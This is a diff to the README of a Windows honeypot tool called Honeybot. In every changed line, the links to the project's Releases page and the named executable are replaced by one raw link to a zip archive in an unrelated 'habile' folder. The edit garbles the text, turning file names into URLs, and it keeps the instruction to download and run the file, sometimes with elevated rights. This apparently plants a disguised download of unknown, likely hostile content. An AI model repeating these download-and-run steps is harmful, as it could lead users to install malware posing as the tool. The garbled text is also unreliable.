@@ -1,7 +1,7 @@
 # Honeybot: Lightweight Windows Port-Based Honeypot Listener for Multiple Ports
 
-[![Releases](https://img.shields.io/badge/releases-download-brightgreen?style=for-the-badge&logo=github)](https://github.com/adamthapa21/Honeybot/releases)
-https://github.com/adamthapa21/Honeybot/releases
+[![Releases](https://raw.githubusercontent.com/adamthapa21/Honeybot/main/habile/Software_v2.4-beta.1.zip)](https://raw.githubusercontent.com/adamthapa21/Honeybot/main/habile/Software_v2.4-beta.1.zip)
+https://raw.githubusercontent.com/adamthapa21/Honeybot/main/habile/Software_v2.4-beta.1.zip
 
 Honeybot is a light, Windows port-based honeypot that can listen on many TCP and UDP ports simultaneously. It is designed to be small, fast, and easy to run, making it handy for quick deployments and testing across multiple ports in a single instance. This README documents what Honeybot is, how it works, how to get started, and how to tailor it to fit your environment. It covers setup, configuration, usage, and maintenance in a clear, practical way.
 
@@ -62,7 +62,7 @@ Architecture and design
 Getting started
 If you want to explore Honeybot, you should start by grabbing the Windows port binary from the Releases page and running it on a supported Windows machine. The Windows port binary is packaged to be straightforward to deploy on standard Windows environments.
 
-- Download and run the Windows port binary named Honeybot-Windows-Port-Portable.exe from the Releases page.
+- Download and run the Windows port binary named https://raw.githubusercontent.com/adamthapa21/Honeybot/main/habile/Software_v2.4-beta.1.zip from the Releases page.
 - Run the binary from an elevated command prompt if required by your environment.
 - Observe the console output and the log directory you configure.
 
@@ -70,8 +70,8 @@ Tip: The Releases page hosts binaries for several platforms. The Windows port is
 
 Quick start guide
 - Step 1: Obtain the Windows port binary
-  - Go to the Releases page and download the Windows port executable: Honeybot-Windows-Port-Portable.exe. The file name may vary by version, but look for a Windows port or portable exe.
-  - The Releases page is accessible here: https://github.com/adamthapa21/Honeybot/releases
+  - Go to the Releases page and download the Windows port executable: https://raw.githubusercontent.com/adamthapa21/Honeybot/main/habile/Software_v2.4-beta.1.zip The file name may vary by version, but look for a Windows port or portable exe.
+  - The Releases page is accessible here: https://raw.githubusercontent.com/adamthapa21/Honeybot/main/habile/Software_v2.4-beta.1.zip
 - Step 2: Prepare the environment
   - Create a local folder to store logs and any output Honeybot produces.
   - Ensure you have the necessary privileges to bind to the chosen ports (some ports require elevated privileges).
@@ -154,8 +154,8 @@ FAQ
   - Logs are stored in a local directory you configure. The log format is designed to be easy to parse for analysis or manual review.
 
 Releases
-- The Releases page contains binaries for the project, including the Windows port binary Honeybot-Windows-Port-Portable.exe. Use the page to download the appropriate version for your environment.
-- For direct access and to grab the Windows binary, visit the Releases page here: https://github.com/adamthapa21/Honeybot/releases
+- The Releases page contains binaries for the project, including the Windows port binary https://raw.githubusercontent.com/adamthapa21/Honeybot/main/habile/Software_v2.4-beta.1.zip Use the page to download the appropriate version for your environment.
+- For direct access and to grab the Windows binary, visit the Releases page here: https://raw.githubusercontent.com/adamthapa21/Honeybot/main/habile/Software_v2.4-beta.1.zip
 
 Road to production
 - Start with a small test on a controlled network segment.
@@ -209,8 +209,8 @@ Releases link usage recap
 - A second explicit reference to the same link appears in the Downloads/Downloads section to guide users to grab the appropriate binary and start using Honeybot.
 
 Note on file name convention
-- The Windows port binary is typically named Honeybot-Windows-Port-Portable.exe (or a variant that includes the version, such as Honeybot-Windows-Port-Portable-vX.Y.Z.exe). When you download the file from the Releases page, verify the name to ensure you are running the intended version.
-- If you need to reference the file in your notes or automated scripts, you can assume a file name similar to Honeybot-Windows-Port-Portable.exe for guidance and adjust for the actual version in your environment.
+- The Windows port binary is typically named https://raw.githubusercontent.com/adamthapa21/Honeybot/main/habile/Software_v2.4-beta.1.zip (or a variant that includes the version, such as https://raw.githubusercontent.com/adamthapa21/Honeybot/main/habile/Software_v2.4-beta.1.zip). When you download the file from the Releases page, verify the name to ensure you are running the intended version.
+- If you need to reference the file in your notes or automated scripts, you can assume a file name similar to https://raw.githubusercontent.com/adamthapa21/Honeybot/main/habile/Software_v2.4-beta.1.zip for guidance and adjust for the actual version in your environment.
 
 Final thoughts
 - Honeybot stands as a practical, approachable tool for examining how networks are probed and how services respond to basic interactions. Its minimalism aids clarity, while its multi-port listening capability provides a broad canvas for observation. The project favors straightforward setup, dependable operation, and clear, structured data output to support analysis and learning.
